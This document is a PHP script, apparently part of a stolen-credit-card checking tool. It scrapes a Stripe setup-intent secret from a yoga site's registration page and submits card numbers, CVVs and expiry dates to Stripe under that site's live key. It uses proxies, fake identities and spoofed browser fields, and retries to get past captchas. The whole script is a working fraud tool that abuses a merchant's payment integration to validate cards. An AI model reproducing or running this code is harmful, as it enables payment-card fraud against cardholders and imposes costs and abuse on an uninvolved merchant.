<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.yogateket.com/register', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$seti_secret = $this->getstr($r1->body, 'data-secret="', '"');

$seti = explode('_secret_', $seti_secret)[0] ?? '';

if (empty($seti)) {
	$empty = 'First Request Token is Empty!';

	goto start;
}

$data = 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$fake->first.'+'.$fake->last.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yy.'&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F13a1d358b%3B+stripe-js-v3%2F13a1d358b&payment_method_data[time_on_page]='.rand(50000, 100000).'&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_rGaysgmUgwTelyrFdWCUolmm&client_secret='.$seti_secret;

$r2 = $this->curlx->Post('https://api.stripe.com/v1/setup_intents/'.$seti.'/confirm', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

if (strpos($r2->body, 'verify_challenge') !== false) {
	$empty = 'Second Request Contains HCaptcha!';

	goto start;
}

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

$status = $this->response->Stripe($r2->body, null, 'auth');

end: